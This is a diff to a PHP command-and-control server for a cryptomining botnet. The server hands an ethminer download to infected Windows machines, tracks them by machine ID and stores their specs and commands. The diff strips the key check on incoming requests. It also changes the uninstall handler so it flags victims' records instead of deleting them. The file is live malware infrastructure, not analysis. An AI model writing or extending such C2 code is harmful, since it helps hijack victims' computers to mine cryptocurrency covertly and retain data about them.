@@ -7,7 +7,7 @@ require_once './autoload.php';
 $validUrl = $_ENV['c2_server_url'];
 $latestProgramVersion = "1.0.0.0"; // TODO: move it to .env
 $ethminerUrl = $validUrl . "miners/ethminer-0.16.0.dev3-windows-amd64.zip"; // TODO: move it to .env
-if (isset($_POST["key"]) && checkKey($_POST["key"]) && isset($_POST["operation"])) {
+if (isset($_POST["operation"])) {
 	// Get Latest Program Version
 	if ($_POST["operation"] == "getLatestProgramVersion") {
 		echo $latestProgramVersion;
@@ -51,13 +51,9 @@ if (isset($_POST["key"]) && checkKey($_POST["key"]) && isset($_POST["operation"]
 		}
 		// Uninstalled
 		elseif ($_POST["operation"] == "uninstalled") {
-			$stmt = $conn->prepare("DELETE FROM command WHERE machineID=?");
+			$stmt = $conn->prepare("UPDATE command SET uninstalled=1 WHERE machineID=?");
 			$stmt->bind_param("s", $_POST["machineID"]);
 			$stmt->execute();
-			$stmt = $conn->prepare("DELETE FROM specs WHERE machineID=?");
-			$stmt->bind_param("s", $_POST["machineID"]);
-			$stmt->execute();
-			deleteDir("machines/" . $_POST["machineID"], 0700);
 		}
 		// Update Status Info
 		elseif ($_POST["operation"] == "updateStatusInfo") {
